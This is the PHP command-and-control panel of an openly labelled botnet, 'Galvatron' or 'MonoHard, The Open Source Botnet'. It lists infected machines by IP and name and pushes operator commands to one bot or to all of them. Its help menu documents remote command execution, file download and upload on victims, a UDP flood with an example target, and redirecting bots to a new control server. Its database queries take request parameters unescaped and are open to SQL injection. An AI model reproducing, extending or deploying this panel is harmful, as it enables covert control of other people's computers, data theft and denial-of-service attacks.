<?php 
/******************************************************************************************
           ____    ____                        ____  ____                       __  
          |_   \  /   _|                      |_   ||   _|                     |  ] 
            |   \/   |   .--.   _ .--.   .--.   | |__| |   ,--.   _ .--.   .--.| |  
            | |\  /| | / .'`\ \[ `.-. |/ .'`\ \ |  __  |  `'_\ : [ `/'`\]/ /'`\' |  
           _| |_\/_| |_| \__. | | | | || \__. |_| |  | |_ // | |, | |    | \__/  |  
          |_____||_____|'.__.' [___||__]'.__.'|____||____|\'-;__/[___]    '.__.;__] . .   .-.    . 
                                                                                    | |   |\|   '| 
                 By Carlos Ganoza || www.todoporelvicio.com                         `.'   `-' .  '
 ******************************************************************************************/
echo "<title> Galvatron Botnet</title>";



include('conexion.php');
date_default_timezone_set("UTC"); 
function ver($tabla)
{
$idX="";
if ($_GET['id'] != null)
{
	$id1 = $_GET['id'];
	echo '<center><pre class="bar"><a href="./cpanel.php">Show All</a></pre></center>';
	$result = mysql_query("SELECT * FROM bot where id=". $id1."");
}
else
{
	$result = mysql_query("SELECT * FROM bot ");
}
echo '<center><table border="0" class="ver">
  <tr class="verhead">
    <td><strong>ID</td>
    <td><strong>&nbsp;&nbsp;&nbsp;IP&nbsp;&nbsp;&nbsp;</td>
    <td><strong>&nbsp;&nbsp;&nbsp; NAME&nbsp;&nbsp;&nbsp; </td>
    <td><strong> &nbsp;&nbsp;&nbsp; STATE &nbsp;&nbsp;&nbsp;</td>
    <td><strong> &nbsp;&nbsp;&nbsp; Time &nbsp;&nbsp;&nbsp;</td>
    <td><strong> &nbsp;&nbsp;&nbsp; DEL &nbsp;&nbsp;&nbsp;</td>
  </tr>';
 
 while($row = mysql_fetch_array($result))
{
 echo "<tr class=\"vertable\">";
   echo " <td class='id'><a href='?id=".$row['id']."'>".$row['id']."</a></td>";
   echo " <td>".$row['ip']."</td>";
   echo " <td>".$row['pc']."</td>";
   if(time()-($row['time'])/60>$row['date']){
  echo "  <td> offline </td>";}
  else
  {echo "  <td> online </td>";}
  echo " <td>".date("Y-m-d H:i:s",$row['date'])."</td>";
   echo " <td class='id'><p align='center'>&nbsp&nbsp<a href='./delete.php?id=".$row['id']."'>D</a>&nbsp&nbsp</p></td>";
 echo " </tr>";
	$idX = $row['idu'];
} 
echo "</table></center>";
//added by khr0x40sh to show returned output
output1($idX);
//added by khr0x40sh to include help menu
echo"<center>
<div id=\"help\" style=\"display:none\";><br/>
<table class=\"help\">
<th>Command</th><th>Description</th><th>Syntax</th>
<tr><td>&lt;command line command&gt;</td><td>Execute command</td><td><b>[command] [arguments]</b></td></tr>
<tr><td>download</td><td>Download</td><td><b>download</b> [url of object to download to bot] [destination]</td></tr>
<tr><td>upload</td><td>Download</td><td><b>upload</b> [path of object to upload from bot] [destination]</td></tr>
<tr><td>kill</td><td>Kill ID</td><td><b>kill</b></td></tr>
<tr><td>msg</td><td>send msg</td><td><b>msg</b> [message to user]</td></tr>
<tr><td>udp</td><td>UDP Flood</td><td><b>udp</b> [vic] [size B] [port] [num] [delay ms]</td></tr>
<tr><td>url</td><td>Change URL</td><td><b>url</b> [url of new C &amp; C]</td></tr>
</table>
<pre><i>Example: <b>udp</b> 172.16.22.1 1024 123 100 10 </i></pre>

</div></center>
";
  
}

function comando($id,$comando)
{
if($comando==NULL)
{
$comando="stop";
}
mysql_query("UPDATE bot SET comando='".$comando."' WHERE id='".$id."'"); 
echo '</p>
<center><form id="form1" name="form1" method="post" action="">
  <label>
  <input name="comando" type="text" class="comando" id="comando"/>
  </label>
  <input name="go!" type="submit" class="comando" id="go!" value="GO!" />
  <p><label></label>
  </p>
</form>
  <input class="comando" type="button" onClick="toggleHelp()" value="Toggle Help"/>';
  
echo '</center><center><p class="fondo">MonoHard, The Open Source Botnet /<span class="bar"><a href="http://www.todoporelvicio.com">Todoporelvicio.com </a>( Carlos Ganoza P.)</p></center>';
}

function comandoall($comando)
{
if ($comando==NULL)
{
$comando="stop";
}
mysql_query("UPDATE bot SET comando='".$comando."'"); 
echo '
<center><form id="form1" name="form1" method="post" action="">
  <label>
  <input name="comando" type="text" class="comando" id="comando"/>
  </label>
  <input name="go!" type="submit" class="comando" id="go!" value="GO!" />
  <p><label></label>
  </p>
</form>
<input class="comando" type="button" onClick="toggleHelp()" value="Toggle Help">
</center>';
echo ' <center><p class="fondo">MonoHard, The Open Source Botnet / <span class="bar"><a href="http://www.todoporelvicio.com">Todoporelvicio.com </a>( Carlos Ganoza P.)</p></center></body>';
}

function output1($id3)
{
echo "<hr/>";
if ($_GET['id'] != null)
{
	$id = $_GET['id'];
	//$top = 1;
	$top = isset($_GET['out'])  ?  $_GET['out']:1;
	$limit = 10;
	$start = ($top - 1) * $limit;
	$nume=0;
	//search feature for output
	//sort by feature for output

	$num = mysql_query("SELECT count(id) from output1 WHERE idu='".$id3."'");
	if (!$num){die('Could not perform query due to:' . mysql_error());}
	while($row=mysql_fetch_array($num)){$nume =$row[0];}
	$result2 =mysql_query("SELECT * FROM output1 where idu='". $id3."' LIMIT ".$start.", ".$limit."");
	if (!$result2)
	{	
		die('Could not retrieve output records: ' . mysql_error());
	}
	else
	{
		echo '<center><table border="0" class="ver">
  	<tr class="verhead">';
	if ($nume > 1)
	{
	//Output from commands
 
    echo '<td><strong>ID</td>
    <td><strong>&nbsp;&nbsp;&nbsp; Date &nbsp;&nbsp;&nbsp; </td>
    <td><strong> &nbsp;&nbsp;&nbsp; Command &nbsp;&nbsp;&nbsp;</td>
    <td><strong> &nbsp;&nbsp;&nbsp; Output &nbsp;&nbsp;&nbsp;</td>
    <td><strong> &nbsp;&nbsp;&nbsp; DEL &nbsp;&nbsp;&nbsp;</td>';
    }
    else
    {
        echo '<td colspan=5> No records were found.</td>';  	
    }
 	echo "</tr>";
 while($row = mysql_fetch_array($result2))
{
 	echo "<tr class=\"outtable\">";
    echo " <td class='id'>".$row['id']."</td>";
    echo " <td>".date("Y-m-d H:i:s",$row['date'])."</td>";
    echo " <td>".$row['command']."</td>";
    echo " <td><pre>".$row['data']."</pre></td>";
    echo " <td class='id'><p align='center'>&nbsp&nbsp<a href='./del.php?id=".$row['id']."'>D</a>&nbsp&nbsp</p></td>";
 	echo " </tr>";

} 
echo "<tfoot class=\"verhead\"><tr><td colspan=\"5\">";
//foreach until complete goes here
$l=1;
	for ($i=0;$i<$nume; $i = $i+$limit)
	{
		echo "<a href='cpanel.php?id=".$id."&out=".$l."'><font face='Vendana' size='4' ";
		if ($i <> $start)
		{
			echo ">"; 
		}
		else
		{
			echo "color=red> ";
		}
		echo "&nbsp;".$l."&nbsp;</a>";
		$l =$l+1;
	} 
echo "</td></tr></tfoot></table></center>";
	
}
}
}
function error($id)
{
header('Content-Type: text/html; charset=UTF-8');
switch ($id) {
    case 1:
        echo utf8_encode("error: Incorrect Password");
        break;
    case 2:
        echo utf8_encode("error: Unknown Error");
        break;
    case 3:
        echo utf8_encode("Session Expired");
        break;
}
}

echo "</html>";
?>
